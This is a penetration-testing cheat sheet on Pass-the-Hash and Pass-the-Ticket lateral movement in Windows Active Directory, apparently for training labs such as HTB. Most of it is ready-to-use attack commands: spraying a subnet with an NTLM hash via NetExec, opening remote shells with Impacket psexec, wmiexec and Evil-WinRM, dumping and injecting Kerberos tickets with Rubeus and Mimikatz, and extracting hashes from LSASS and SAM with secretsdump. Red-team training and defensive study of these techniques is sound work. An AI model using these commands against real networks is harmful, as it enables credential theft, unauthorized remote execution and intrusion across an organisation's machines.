# Pass-the-Hash and Pass-the-Ticket

Two core lateral movement primitives. PtH uses NTLM hashes; PtT injects Kerberos tickets. Neither requires knowing the plaintext password.

## Pass-the-Hash (PtH)

NTLM auth accepts the hash directly — no cracking needed.

**NetExec — check access:**
```bash
nxc smb TARGET_IP -u administrator -H :NTLM_HASH
nxc smb 192.168.1.0/24 -u administrator -H :NTLM_HASH   # Spray subnet
nxc winrm TARGET_IP -u administrator -H :NTLM_HASH
```

**Impacket tools:**
```bash
# Interactive shell (like PsExec)
psexec.py domain.local/admin@TARGET -hashes :NTLM_HASH

# WMI execution (less noisy than psexec)
wmiexec.py domain.local/admin@TARGET -hashes :NTLM_HASH

# SMB exec
smbexec.py domain.local/admin@TARGET -hashes :NTLM_HASH
```

**Evil-WinRM:**
```bash
evil-winrm -i TARGET_IP -u administrator -H NTLM_HASH
```

**Hash format:** Always `:NTLM_HASH` (LM part is empty). Full format is `LM:NT` — use `aad3b435b51404eeaad3b435b51404ee:NTLM_HASH`.

## Pass-the-Ticket (PtT)

Inject a Kerberos ticket into your session to impersonate a user.

**Dump tickets on Windows (Rubeus):**
```powershell
.\Rubeus.exe dump /nowrap           # Dump all tickets in memory
.\Rubeus.exe tgtdeleg               # Get usable TGT via delegation trick
```

**Inject ticket (Rubeus):**
```powershell
.\Rubeus.exe ptt /ticket:base64_encoded_ticket
klist     # Verify ticket is loaded
```

**Inject ticket (Mimikatz):**
```powershell
kerberos::ptt C:\path\to\ticket.kirbi
kerberos::list     # Verify
```

**From Linux — ccache files:**
```bash
export KRB5CCNAME=/tmp/ticket.ccache
klist
psexec.py -k -no-pass domain.local/admin@TARGET
```

## Obtain Hashes to Use

```bash
# From LSASS dump (Impacket, needs admin)
secretsdump.py domain/admin:pass@TARGET

# From local SAM (local admin)
secretsdump.py -sam sam.bak -system system.bak LOCAL
```

**Practice:** VulnLab or HTB Pro Labs (Offshore) — multi-hop chains where PtH is the primary pivot method.
